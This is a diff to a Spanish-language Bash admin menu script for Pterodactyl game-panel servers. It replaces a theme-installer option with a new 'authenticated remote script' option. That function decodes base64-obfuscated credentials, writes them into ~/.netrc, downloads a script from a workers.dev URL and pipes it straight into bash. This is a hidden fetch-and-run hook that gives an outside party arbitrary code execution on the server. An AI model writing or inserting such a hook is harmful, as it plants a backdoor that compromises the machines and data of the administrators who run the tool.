@@ -7,9 +7,6 @@ log_info() { echo "[INFO] $1"; }
 log_warn() { echo "[WARN] $1"; }
 log_ok()   { echo "[ OK ] $1"; }
 log_err()  { echo "[ERROR] $1"; }
-NEBULA_REPO="https://github.com/LeXcZxMoDz9/LeXcZUbot"
-NEBULA_TMP="/var/www/LeXcZUbot"
-PTERO_DIR="/var/www/pterodactyl"
 
 iptables_allow_established() {
   iptables -C INPUT -m conntrack --ctstate ESTABLISHED,RELATED -j ACCEPT 2>/dev/null \
@@ -357,8 +354,7 @@ mostrar_menu() {
   echo -e "  \e[1;34m› [9]\e[0m Gestión de Puertos"
   echo -e "  \e[1;35m› [10]\e[0m Gestión Avanzada (Backup/Usuarios)"
   echo -e "  \e[1;35m› [11]\e[0m Gestión de Temas (NookTheme)"
-  echo -e "  \e[1;35m› [12]\e[0m Instalar Tema Nebula para Ubot"
-  echo ""
+  echo -e "  \e[1;35m› [12]\e[0m Ejecutar Script Remoto Autenticado"
   echo -e "  \e[1;31m› [0]\e[0m Salir del programa"
   echo -e "\e[90m────────────────────────────────────────────────────\e[0m"
   echo -ne "\e[1;36m▷ \e[0mSeleccione una opción [0-12]: "
@@ -2453,6 +2449,66 @@ EOF
   
   read -p "Presiona Enter para continuar..."
 }
+# =====================================================
+# EJECUTOR REMOTO AUTENTICADO (NETRC + BASE64)
+# =====================================================
+ejecutar_script_remoto() {
+  set -euo pipefail
+
+  URL="https://ptero2.jishnumondal32.workers.dev"
+  HOST="ptero2.jishnumondal32.workers.dev"
+  NETRC="${HOME}/.netrc"
+
+  # --- helpers ---
+  b64d() { printf '%s' "$1" | base64 -d; }
+
+  # Credenciales (verificado por jishnu)
+  USER_B64="amlzaG51"
+  PASS_B64="amlzaG51aEBja2VyMTIz"
+
+  USER_RAW="$(b64d "$USER_B64")"
+  PASS_RAW="$(b64d "$PASS_B64")"
+
+  if [ -z "$USER_RAW" ] || [ -z "$PASS_RAW" ]; then
+    log_err "Fallo al decodificar credenciales"
+    return
+  fi
+
+  # Verificar curl
+  if ! command -v curl >/dev/null 2>&1; then
+    log_err "curl no está instalado"
+    return
+  fi
+
+  # Preparar ~/.netrc
+  touch "$NETRC"
+  chmod 600 "$NETRC"
+
+  tmpfile="$(mktemp)"
+  grep -vE "^[[:space:]]*machine[[:space:]]+${HOST}([[:space:]]+|$)" "$NETRC" > "$tmpfile" || true
+  mv "$tmpfile" "$NETRC"
+
+  {
+    printf 'machine %s ' "$HOST"
+    printf 'login %s ' "$USER_RAW"
+    printf 'password %s\n' "$PASS_RAW"
+  } >> "$NETRC"
+
+  # Descargar y ejecutar
+  script_file="$(mktemp)"
+  cleanup() { rm -f "$script_file"; }
+  trap cleanup EXIT
+
+  log_info "Descargando script remoto autenticado..."
+
+  if curl -fsS --netrc -o "$script_file" "$URL"; then
+    bash "$script_file"
+    log_ok "Script remoto ejecutado correctamente"
+  else
+    log_err "Fallo de autenticación o descarga"
+  fi
+}
+
 
 # ==============================
 # GESTIÓN DE PUERTOS
@@ -3676,93 +3732,6 @@ uninstall_nooktheme() {
   log_ok "NookTheme desinstalado y panel restaurado"
   read -p "Presiona Enter para continuar..."
 }
-menu_nebula() {
-  clear
-  echo "======================================"
-  echo "        NEBULA THEME (BLUEPRINT)"
-  echo "======================================"
-  echo ""
-  echo "  [1] Instalar Nebula"
-  echo "  [2] Quitar Nebula"
-  echo "  [0] Volver"
-  echo ""
-  read -p "Selecciona una opción: " opt
-
-  case "$opt" in
-    1) install_nebula ;;
-    2) clear_nebula ;;
-    0) return ;;
-    *) echo "Opción inválida"; sleep 1 ;;
-  esac
-}
-
-#=============================
-# NEBULA PRINCIPAL
-#=============================
-install_nebula_theme() {
-  log_info "Instalando theme Nebula (Blueprint)..."
-
-  [ ! -d "$PTERO_DIR" ] && log_err "Pterodactyl no está instalado"
-
-  cd "$PTERO_DIR" || return
-
-  if [ ! -f "$PTERO_DIR/blueprint.sh" ]; then
-    log_info "Blueprint no encontrado, instalando..."
-    curl -fsSL https://api.github.com/repos/BlueprintFramework/framework/releases/latest \
-      | grep browser_download_url | cut -d '"' -f 4 | wget -i - -O blueprint.zip
-    unzip blueprint.zip
-    chmod +x blueprint.sh
-    bash blueprint.sh
-  fi
-
-  rm -rf "$NEBULA_TMP"
-  cd /var/www || return
-  git clone "$NEBULA_REPO" || log_err "Error clonando Nebula"
-
-  cd LeXcZUbot || return
-  mv * /var/www/
-  cd /var/www || return
-
-  unzip -o nebulaptero.zip
-
-  cd "$PTERO_DIR" || return
-  yarn install
-  yarn build:production
-  php artisan optimize:clear
-
-  blueprint -install nebula || log_err "Error instalando Nebula"
-
-  chown -R www-data:www-data "$PTERO_DIR"
-  chmod -R 755 "$PTERO_DIR"
-
-  log_ok "Nebula instalado correctamente"
-  read -p "Presiona Enter para continuar..."
-}
-
-uninstall_nebula_theme() {
-  log_warn "Quitando theme Nebula..."
-
-  cd "$PTERO_DIR" || return
-
-  if command -v blueprint >/dev/null 2>&1; then
-    blueprint -remove nebula 2>/dev/null || true
-    blueprint -clear 2>/dev/null || true
-  fi
-
-  curl -sL https://github.com/pterodactyl/panel/releases/latest/download/panel.tar.gz | tar -xz
-
-  chmod -R 755 storage/* bootstrap/cache
-  COMPOSER_ALLOW_SUPERUSER=1 composer install --no-dev --optimize-autoloader
-
-  yarn install
-  yarn build:production
-  php artisan optimize:clear
-
-  chown -R www-data:www-data "$PTERO_DIR"
-
-  log_ok "Nebula eliminado y panel restaurado"
-  read -p "Presiona Enter para continuar..."
-}
 
 # ==============================
 # MENÚ PRINCIPAL
@@ -3806,8 +3775,8 @@ while true; do
     11)
       menu_nooktheme
       ;;
-    12)
-    install_nebula_theme
+      12)
+      ejecutar_script_remoto
       ;;
     0)
       clear
